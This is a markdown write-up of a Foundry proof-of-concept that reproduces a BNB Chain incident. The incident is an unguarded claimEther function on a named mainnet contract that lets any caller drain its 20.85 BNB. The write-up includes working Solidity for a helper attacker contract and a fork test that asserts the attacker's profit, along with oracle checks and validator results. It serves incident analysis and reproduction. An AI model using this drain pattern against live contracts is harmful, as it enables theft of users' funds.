# BNB Chain `claimEther` Uncontrolled Withdrawal PoC

## 1. Overview & Context

This proof-of-concept (PoC) reproduces the BNB Chain incident in which contract `0xedd632eaf3b57e100ae9142e8ed1641e5fd6b2c0` exposes an unguarded `claimEther(address,uint256)` function that allows any caller to drain the contract’s native BNB balance. The PoC is implemented as a Foundry test that runs on a BNB Chain mainnet fork and follows the root-cause analysis described in the incident report.

- **Chain**: BNB Chain (`chainid = 56`)
- **Victim contract**: `0xedd632eaf3b57e100ae9142e8ed1641e5fd6b2c0`
- **Exploit pattern**: Helper contract constructor calls `claimEther(attacker, amount)` once to drain 20.85 BNB.
- **Goal of PoC**: Demonstrate that an unprivileged attacker can fully drain the victim’s native BNB balance via `claimEther`, and enforce the oracle constraints derived from on-chain traces and pre-state analysis.

**Command to run the PoC** (from the Forge project root):

```bash
cd /home/ziyue/TxRayExperiment/incident-202512260839/forge_poc
RPC_URL="<BNB Chain QuickNode RPC URL>" forge test --via-ir -vvvvv
```

The `RPC_URL` must point to a BNB Chain mainnet node (chainid 56) at or before block `43,860,720`, and is injected via the environment.

## 2. PoC Architecture & Key Contracts

### 2.1 Victim Interface

The PoC models only the part of the victim contract that matters for the exploit: the uncontrolled `claimEther` function. A minimal interface is defined so the test can call the real on-chain contract at the correct address.

**Snippet 1 – Minimal victim interface**  
Origin: PoC victim interface used in the test.

```solidity
interface IVictimClaimEther {
    /// @dev Withdraws native BNB (ETH in Foundry) from the contract
    ///      to `to`, for `amount` wei, without any access control.
    function claimEther(address to, uint256 amount) external;
}
```

This interface reflects the decompiled on-chain function, which transfers arbitrary native BNB to any address without checking `msg.sender` or stored entitlements.

### 2.2 Helper Attacker Contract

The real incident involved an attacker EOA deploying a small helper contract whose constructor immediately called `claimEther(attacker, 20.85 BNB)` on the victim. The PoC mirrors this structure with a local helper contract.

**Snippet 2 – Helper attacker constructor**  
Origin: `ClaimEtherHelperAttacker` contract in the PoC.

```solidity
contract ClaimEtherHelperAttacker {
    constructor(address victim, address attacker, uint256 amount) {
        IVictimClaimEther(victim).claimEther(attacker, amount);
    }
}
```

The constructor performs a single external call to `victim.claimEther(attacker, amount)`. There is no additional logic or post-construction behavior, matching the thin wrapper observed in the on-chain trace.

### 2.3 Main Test Contract

The main PoC logic lives in the `ClaimEtherExploitTest` contract, which:

- Forks BNB Chain at block `43,860,720` using `vm.createSelectFork(RPC_URL, 43_860_720)`.
- Sets up a fresh attacker EOA using Foundry’s `makeAddr("attacker")` utility.
- Forces the victim and attacker balances to match the pre-state from the root-cause analysis.
- Runs the exploit via the helper contract and asserts attacker profit and victim depletion.

**Snippet 3 – Key state and setup fields**  
Origin: `ClaimEtherExploitTest` state variables and `setUp`.

```solidity
contract ClaimEtherExploitTest is Test {
    address internal constant VICTIM_CONTRACT =
        0xedD632eAf3b57e100aE9142e8eD1641e5Fd6b2c0;

    address internal attacker;
    uint256 internal attackerBalanceBefore;
    uint256 internal victimBalanceBefore;

    function setUp() public {
        string memory rpcUrl = vm.envString("RPC_URL");
        vm.createSelectFork(rpcUrl, 43_860_720);

        vm.label(VICTIM_CONTRACT, "VictimClaimEther");
        attacker = makeAddr("attacker");
        vm.label(attacker, "AttackerEOA");

        vm.deal(VICTIM_CONTRACT, 20.85 ether);
        vm.deal(attacker, 0.1 ether);

        assertEq(block.chainid, 56, "fork must be on BNB Chain (56)");
        victimBalanceBefore = VICTIM_CONTRACT.balance;
        assertEq(victimBalanceBefore, 20.85 ether);
        attackerBalanceBefore = attacker.balance;
        assertGt(attackerBalanceBefore, 0);
        assertLt(attackerBalanceBefore, victimBalanceBefore);
    }
}
```

This setup ensures that the PoC runs in the correct chain context and reproduces the pre-exploit balances: the victim holds exactly 20.85 BNB, and the attacker holds a small, nonzero balance that is strictly smaller than the victim’s balance.

## 3. Adversary Execution Flow

The adversary behavior in the PoC follows the ACT framing from the incident analysis and is implemented as a single Foundry test: `test_ExploitClaimEther`.

### 3.1 Funding and Environment Setup

- The test environment is forked from BNB Chain at block `43,860,720`.
- The victim contract’s native balance is set to exactly 20.85 BNB using `vm.deal`.
- The attacker EOA receives 0.1 BNB, enough to pay gas but much less than the victim’s balance.
- Assertions enforce that the chainid is 56 and that the balances match the intended pre-state.

These steps ensure that the PoC is robust: even if live fork balances drift, the oracle pre-checks and assertions keep the pre-state consistent with the root-cause report.

### 3.2 Deployment and Configuration

The exploit step is executed from the attacker EOA by deploying the helper contract.

**Snippet 4 – Main exploit test function**  
Origin: `ClaimEtherExploitTest.test_ExploitClaimEther`.

```solidity
function test_ExploitClaimEther() public {
    address profitToken = address(0);
    assertEq(profitToken, address(0));

    uint256 withdrawAmount = victimBalanceBefore;
    uint256 attackerBalanceBeforeExploit = attacker.balance;

    vm.startPrank(attacker);
    new ClaimEtherHelperAttacker(VICTIM_CONTRACT, attacker, withdrawAmount);
    vm.stopPrank();

    uint256 victimBalanceAfter = VICTIM_CONTRACT.balance;
    assertEq(victimBalanceAfter, 0);

    uint256 attackerBalanceAfter = attacker.balance;
    uint256 profit = attackerBalanceAfter - attackerBalanceBeforeExploit;
    assertGe(profit, 20.84 ether);

    uint256 drained = victimBalanceBefore - victimBalanceAfter;
    assertGe(drained, 20.85 ether);
}
```

Key points:

- `profitToken` is fixed to `address(0)`, modeling native BNB (ETH in Foundry).
- `withdrawAmount` is set to the victim’s full pre-state balance (20.85 BNB).
- A prank from `attacker` deploys `ClaimEtherHelperAttacker`, whose constructor calls `claimEther(attacker, withdrawAmount)`.
- The call must not revert, demonstrating that an unprivileged attacker can execute `claimEther` successfully.

### 3.3 Exploit Execution and Profit Realization

After the helper constructor runs:

- The victim’s native balance is required to drop to zero.
- The attacker’s native balance must increase by at least 20.84 BNB, capturing essentially the full 20.85 BNB drain (allowing a small tolerance for gas modeling vs. the incident’s ~20.8497 BNB net profit).

The PoC does not attempt to model the attacker’s subsequent mixing and fragmentation behavior (e.g., deposits into `0x0d55...b17`), since those transfers occur after the primary exploit predicate has been realized.

## 4. Oracle Definitions and Checks

The oracle definition JSON specifies variables, pre-checks, and oracle constraints that the PoC must satisfy.

### 4.1 Variables

From the oracle definition:

- `attacker`: the adversary EOA; no fixed address is required.
- `victim_contract`: the victim contract at `0xedd632eaf3b57e100ae9142e8ed1641e5fd6b2c0`.
- `bnb_token`: a logical token representing native BNB, modeled as `ETH` (native asset) in Foundry.

In the PoC:

- `attacker` is implemented as a fresh address from `makeAddr("attacker")`.
- `victim_contract` is modeled as `VICTIM_CONTRACT` and accessed via `IVictimClaimEther`.
- `bnb_token` is implicitly represented by `address(0)` as the native asset.

### 4.2 Pre-checks

The oracle pre-checks are:

1. **BNB Chain fork (chainid 56)** – The fork must run on BNB Chain.
   - Implemented via `vm.createSelectFork(rpcUrl, 43_860_720)` and `assertEq(block.chainid, 56, ...)`.

2. **Victim holds exactly 20.85 BNB** – The victim’s pre-exploit native balance is 20.85 BNB.
   - Implemented by `vm.deal(VICTIM_CONTRACT, 20.85 ether)` and an assertion `assertEq(victimBalanceBefore, 20.85 ether, ...)`.

3. **Attacker low but nonzero balance** – The attacker starts with a nonzero BNB balance strictly smaller than the victim’s balance.
   - Implemented by `vm.deal(attacker, 0.1 ether)`, then `assertGt(attackerBalanceBefore, 0)` and `assertLt(attackerBalanceBefore, victimBalanceBefore)`.

All three pre-checks are enforced in `setUp`, ensuring that the exploit sequence begins from a state consistent with the root-cause pre-state σₜ.

### 4.3 Hard Constraints

The hard constraints in the oracle definition are:

1. **Asset type – native BNB** (`hc_asset_type_native_bnb`)
   - Requirement: The exploited asset is BNB (native), modeled as ETH in Foundry.
   - Implementation: `address profitToken = address(0); assertEq(profitToken, address(0), ...)` in `test_ExploitClaimEther`, explicitly tying the profit accounting to the native asset.

2. **`claimEther` succeeds for an unprivileged attacker** (`hc_claimEther_succeeds_for_unprivileged_attacker`)
   - Requirement: A call to `claimEther(attacker, withdrawAmount)` from an attacker EOA must succeed without reverting.
   - Implementation: The test deploys `ClaimEtherHelperAttacker` inside a prank from `attacker`, so the constructor calls `IVictimClaimEther(VICTIM_CONTRACT).claimEther(attacker, withdrawAmount)` under the attacker’s authority. Any revert would fail the test.

3. **Victim balance zero after exploit** (`hc_victim_balance_zero_after_exploit`)
   - Requirement: After the exploit, the victim contract’s native balance must be zero.
   - Implementation: `uint256 victimBalanceAfter = VICTIM_CONTRACT.balance; assertEq(victimBalanceAfter, 0, ...)` directly enforces this.

### 4.4 Soft Constraints

The soft constraints are profit- and depletion-focused:

1. **Attacker profit in native BNB** (`sc_attacker_profit_native_bnb`)
   - Requirement: The attacker’s net native BNB position must increase by at least ~20.84 BNB, corresponding to draining 20.85 BNB minus gas.
   - Implementation: The test snapshots `attackerBalanceBeforeExploit = attacker.balance`, then computes
     `profit = attackerBalanceAfter - attackerBalanceBeforeExploit` and enforces `assertGe(profit, 20.84 ether, ...)`.

2. **Victim depletion in native BNB** (from the oracle’s victim-loss soft constraint)
   - Requirement: The victim must lose approximately the full 20.85 BNB balance.
   - Implementation: The test computes `drained = victimBalanceBefore - victimBalanceAfter` and asserts `assertGe(drained, 20.85 ether, ...)`.

Taken together, these assertions fully implement the oracle specification: they require the exploit to transfer essentially the entire victim balance to the attacker in native BNB.

## 5. Validation Result and Robustness

The validator executed the PoC using Foundry with a BNB Chain RPC endpoint. The key observations are:

- All tests, including `test_ExploitClaimEther`, pass on a BNB Chain fork at block `43,860,720`.
- The detailed trace shows:
  - `vm.createSelectFork("<rpc url>", 43860720)` selecting the correct block.
  - `vm.deal` calls establishing the victim’s 20.85 BNB balance and the attacker’s small starting balance.
  - A deployment of `ClaimEtherHelperAttacker` from the attacker EOA, whose constructor executes `VictimClaimEther::claimEther(attacker, 20.85 BNB)`.
  - The victim’s balance dropping to zero and the attacker receiving the transferred BNB.

The validator’s JSON result is stored at:

- `/home/ziyue/TxRayExperiment/incident-202512260839/artifacts/poc/poc_validator/poc_validated_result.json`

In that result file:

- `overall_status` is **"Pass"**.
- `poc_correctness_checks.passes_validation_oracles.passed` is **true**, confirming that all defined oracles are satisfied.
- All quality checks (oracle alignment, human readability, absence of attacker-side artifacts, mainnet fork usage, end-to-end attack description, and alignment with the root cause) are marked as passing.
- The associated Forge test log is recorded under `artifacts.validator_test_log_path`.

Overall, the PoC is robust: it explicitly enforces the pre-state, runs on a real fork without mocks, and asserts the exploit’s success conditions in a way that should remain stable across reasonable environment variations.

## 6. Linking PoC Behavior to Root Cause

The root-cause report identifies a protocol-level bug in `claimEther(address,uint256)` on contract `0xedd6...b2c0`:

- The function is publicly callable.
- It transfers arbitrary native BNB to any supplied address.
- It performs no access control or entitlement checks.

The PoC directly exercises this buggy behavior and ties it back to the ACT framing:

- **Adversary-crafted step (A):** The attacker EOA (modeled as a fresh Foundry address) deploys a helper contract whose constructor immediately calls `claimEther(attacker, 20.85 BNB)`.
- **Contract behavior (C):** The victim contract accepts this call from an unprivileged EOA and transfers its entire native balance to the attacker without checking `msg.sender` or prior entitlements.
- **Trace/observation (T):** The test’s assertions confirm that the victim’s native balance goes from 20.85 BNB to 0 and that the attacker’s balance increases by at least ~20.84 BNB, matching the on-chain balance diffs from the incident.

By reproducing the exploit on a mainnet fork with the correct pre-state and asserting both victim loss and attacker profit, the PoC faithfully represents the root cause: an uncontrolled `claimEther` function that allows complete native balance withdrawal by any caller.
